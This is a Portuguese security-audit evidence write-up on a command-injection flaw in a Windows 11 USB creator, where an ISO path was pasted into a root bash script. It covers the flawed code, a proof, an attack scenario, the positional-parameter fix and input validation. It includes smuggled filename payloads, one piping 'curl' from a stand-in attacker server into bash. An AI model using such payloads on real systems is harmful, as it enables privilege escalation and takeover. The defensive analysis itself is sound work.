# Evidência técnica — Injeção de comando (achado #1, gravidade Alta)

Este documento guarda a prova do achado mais grave da auditoria, para que
qualquer pessoa possa verificar de forma independente.

---

## O conceito, em uma frase

O programa montava a ordem para o sistema **grudando o nome do arquivo dentro do
texto do comando**. Um nome preparado com maldade "fechava" o comando no meio e
emendava comandos novos — que rodavam **como administrador da máquina**.

É o mesmo mecanismo do famoso SQL Injection, aplicado a comandos do sistema.

---

## 1. Código vulnerável (versão original, linha 406)

```python
prep_script = (
    "set -e\n"
    f'wipefs -a {dev}\n'
    ...
    f'mount -o loop,ro,uid={uid},gid={gid} "{iso_path}" "{iso_mount}"\n'
    #                                      ^^^^^^^^^^ valor colado no texto
)
priv.run_script(prep_script, log)   # -> sudo bash -c "<texto acima>"
```

`iso_path` é o caminho do arquivo escolhido pelo usuário na janela de seleção.

---

## 2. Prova de que a falha era real

Reproduzi a montagem da string exatamente como o código fazia, **sem executar
nada**, usando um nome de arquivo malicioso:

**Nome do arquivo:**
```
/tmp/Win11.iso" ; id > /tmp/PROVA_INJECAO.txt ; echo "
```

**Texto gerado, que iria inteiro para o `bash` como root:**
```
set -e
wipefs -a /dev/sdb
mkfs.vfat -F 32 -n WIN11USB /dev/sdb1
mount -o loop,ro,uid=501,gid=20 "/tmp/Win11.iso" ; id > /tmp/PROVA_INJECAO.txt ; echo "" "/tmp/win11iso_x"
└──────────── comando 1 (esperado) ───────────┘ └── comando 2 (INJETADO) ──┘ └─ comando 3 ─┘
```

O que deveria ser **um** comando `mount` virou **três comandos**. O do meio foi
escrito pelo atacante.

---

## 3. Cenário de exploração realista

Vale ser preciso, porque a resposta tem uma nuance que afeta a gravidade.

**O que NÃO é o cenário:** um usuário com senha de administrador escolhendo
voluntariamente um arquivo malicioso está atacando a si mesmo, e não ganharia
nada — poderia digitar comandos de administrador diretamente.

**O cenário real:** um programa qualquer (instalador duvidoso, anexo de e-mail,
arquivo `.zip`) deixa na pasta Downloads um arquivo chamado:

```
Windows11_24H2_PTBR" ; curl -s http://servidor-do-atacante/x | bash ; ".iso
```

O usuário abre o programa, clica em "Select existing ISO file", vê um arquivo com
cara de ISO do Windows, seleciona, e digita a senha de administrador **acreditando
que está autorizando a formatação de um pendrive**.

É uma **escalação de privilégio**: sai de *"o atacante conseguiu criar um arquivo
na pasta Downloads"* para *"o atacante tem controle total da máquina"*.

**Classificação: Alta** (não Crítica) porque exige interação do usuário e uma
condição prévia — o atacante já precisa conseguir criar um arquivo com nome
controlado no computador.

---

## 4. A correção

Os valores passaram a viajar por um **canal separado do comando** — parâmetros
posicionais do shell. É o mesmo princípio das *prepared statements* que protegem
bancos de dados.

**`win11_usb_creator.py:326`**

```python
def run_script(self, script, log, args=None, max_attempts=3):
    """Values are NEVER interpolated into the script text."""
    args = [str(a) for a in (args or [])]
    # bash -c SCRIPT NAME ARG1 ARG2 -> dentro do SCRIPT: $0=NAME, $1=ARG1, ...
    bash_argv = ["bash", "-c", script, "win11_usb_creator"] + args
```

**`win11_usb_creator.py:636`**

```python
prep_script = (
    'set -eu\n'
    'DEV="$1"; PART="$2"; ISO="$3"; ISO_MNT="$4"; USB_MNT="$5"; OWNER="$6"\n'
    'wipefs -a "$DEV"\n'
    ...
    'mount -o loop,ro,uid="${OWNER%%:*}",gid="${OWNER##*:}" "$ISO" "$ISO_MNT"\n'
)
priv.run_script(prep_script, log,
                args=[dev, part, iso_path, iso_mount, usb_mount, f"{uid}:{gid}"])
```

O texto do script é agora **fixo**. Os valores chegam como `$1`, `$2`... e o
`bash` os trata como dados, nunca como instruções.

---

## 5. Prova de que a correção funciona

Os dois padrões foram executados de verdade (sem privilégio, sem tocar em disco),
com o mesmo nome de arquivo malicioso:

```
== PADRÃO ANTIGO (valor colado no texto do script) ==
montaria: /tmp/Win11.iso
arquivo PROVA_INJECAO.txt criado?  True      <- o comando injetado EXECUTOU

== PADRÃO NOVO (valor como parâmetro posicional) ==
montaria: /tmp/Win11.iso" ; touch PROVA_INJECAO.txt ; echo "
arquivo PROVA_INJECAO.txt criado?  False     <- tratado como TEXTO, não executou
```

Repare na segunda saída: o texto malicioso aparece **impresso por inteiro**, como
o valor de uma variável. Foi lido como dado, exatamente como deveria.

Este teste está incluído na suíte automatizada, seção 4 de
[`testes_validacao.py`](testes_validacao.py).

---

## 6. Defesa em profundidade

Além da correção principal, foi acrescentada validação estrita dos identificadores
de disco — que **recusa** valores fora do formato esperado em vez de tentar
escapá-los (`win11_usb_creator.py:207`):

```python
MAC_DEVICE_RE = re.compile(r"^disk[0-9]+$")
LINUX_DEVICE_RE = re.compile(r"^[a-zA-Z0-9_+-]{1,32}$")
```

Não existe nome de disco legítimo com espaço, aspas ou ponto-e-vírgula. Recusar é
mais seguro que escapar: uma regra de escape pode ter exceções esquecidas; uma
lista de caracteres permitidos, não.
